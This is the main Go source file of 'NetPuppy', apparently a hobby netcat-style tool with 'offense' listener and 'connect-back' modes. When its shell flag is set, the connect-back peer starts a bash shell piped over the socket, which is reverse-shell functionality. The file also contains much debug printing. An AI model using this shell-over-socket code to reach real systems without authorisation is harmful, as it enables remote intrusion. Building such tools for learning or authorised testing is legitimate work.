package main

import (
	"bufio"
	"bytes"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"time"

	// NetPuppy modules:
	"netpuppy/utils"
)

func runApp(c utils.ConnectionGetter) {
	// Parse flags from user, attach to struct:
	flagStruct := utils.GetFlags()

	// Print banner:
	fmt.Printf("%s", utils.Banner())

	// Create peer instance based on user input:
	var thisPeer *utils.Peer = utils.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)
	fmt.Printf("Address of peer in main.go = %p\n", thisPeer)

	// Update user:
	var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
	fmt.Println(updateUserBanner)

	// Make connection:
	var socket utils.Socket
	if thisPeer.ConnectionType == "offense" {
		socket = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
		//fmt.Printf("Socket address in main.go = %p\n", socket)
	} else {
		socket = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address)
	}

	fmt.Printf("Address of socket in main.go: %p\n", socket)

	// Connect socket connection to peer
	thisPeer.Connection = socket
	fmt.Printf("Address of socket on peer struct = %p\n", thisPeer.Connection)

	// If shell flag is true, start shell:
	var shell utils.BashShell
	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		var realShellGetter utils.RealShellGetter

		shell = realShellGetter.GetConnectBackInitiatedShell()
		fmt.Printf("Address of shell in main.go: %p\n", shell)

		// Connect shell to peer:
		// Get pointer to shell underlying interface:
		thisPeer.ShellProcess = shell
		fmt.Printf("address of shell on peer struct (main.go) = %p\n", thisPeer.ShellProcess)
	}

	// Update banner w/ missing port:
	// var missingPortInBanner = utils.PrintMissingPortToBanner(thisPeer.ConnectionType, thisPeer.Connection)
	// fmt.Println(missingPortInBanner)

	// Start SIGINT go routine & start channel to listen for SIGINT:
	listenForSIGINT(thisPeer)

	// var stdin *io.WriteCloser
	// var stdout *io.ReadCloser
	// var stderr *io.ReadCloser

	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
		// Start shell:
		socketT := socket.(*utils.RealSocket)
		erR := thisPeer.ShellProcess.StartShell(socketT)
		if erR != nil {
			log.Fatalf("Error starting shell process: %v\n", erR)
		}
	} else {
		// Go routines to read incoming data:
		readUserInput := func(c chan<- string) {
			for {
				userReader := bufio.NewReader(os.Stdin)
				userInput, err := userReader.ReadString('\n')
				if err != nil {
					log.Fatalf("Error reading input from user: %v\n", err)
				}

				c <- userInput
			}
		}

		readSocket := func(socket utils.Socket, c chan<- []byte) {
			// Read data in socket:
			for {
				dataReadFromSocket, err := socket.Read()
				if len(dataReadFromSocket) > 0 {
					fmt.Printf("data from socket is lenght: %v\n", len(dataReadFromSocket))
					// Trim white space:
					trimmed := bytes.TrimSpace(dataReadFromSocket)

					fmt.Printf("trimmed: %s\n", string(trimmed))
					c <- dataReadFromSocket
				}
				if err != nil {
					//Check for timeout error using net pkg:
					//....... (type assertion checks if 'err' uses net.Error interface)
					//....... (( isANetError will be true if it is using the net.Error interface))
					netErr, isANetError := err.(net.Error)
					if isANetError && netErr.Timeout() {
						// If the socket timed out, have to set read deadline again (or connection will close):
						//socket.SetSocketReadDeadline(300)
						continue
					} else if errors.Is(err, io.EOF) {
						continue
					} else {
						log.Fatalf("Error reading data from socket: %v\n", err)
					}
				}
			}
		}

		// Write go routines
		writeToSocket := func(dataToWrite string, socket utils.Socket) {
			// Check length so we can clear channel, but not send blank data:
			if len(dataToWrite) > 0 {
				fmt.Printf("writing to socket\n")
				bytesWritten, erR := socket.Write([]byte(dataToWrite))
				if erR != nil {
					log.Fatalf("Error writing user input buffer to socket: %v\n", erR)
				}

				if bytesWritten <= 0 {
					fmt.Printf("No bytes written to socket?\n")
				}
			}
			return
		}

		printToUser := func(data []byte) {
			// Check the length:
			if len(data) > 0 {
				_, err := os.Stdout.Write(data)
				if err != nil {
					log.Fatalf("Error printing data to user: %v\n", err)
				}
			}
			return
		}

		// Make channels:
		userInputChan := make(chan string)
		socketDataChan := make(chan []byte)
		defer func() {
			close(userInputChan)
			close(socketDataChan)
		}()

		// Start go routines to read from socket and user:
		go readSocket(socket, socketDataChan)
		go readUserInput(userInputChan)

		for {
			select {
			case dataFromUser := <-userInputChan:
				go writeToSocket(dataFromUser, socket)
			case dataFromSocket := <-socketDataChan:
				go printToUser(dataFromSocket)
			default:
				// Timeout:
				time.Sleep(3 * time.Millisecond)
			}
		}
	}
}

func listenForSIGINT(thisPeer *utils.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
	// If SIGINT: close connection, exit w/ code 2
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	go func() {
		for sig := range signalChan {
			if sig.String() == "interrupt" {
				fmt.Printf("signal: %v\n", sig)
				thisPeer.Connection.Close()
				os.Exit(2)
			}
		}
	}()
}

func main() {
	// In order to test the connection code w/o creating REAL sockets, runApp() handles most of the logic:
	var realConnection utils.RealConnectionGetter
	runApp(realConnection)
}

/*


golang process (os.stdin)
	- starts subprocess bash shell
	- -c



*/
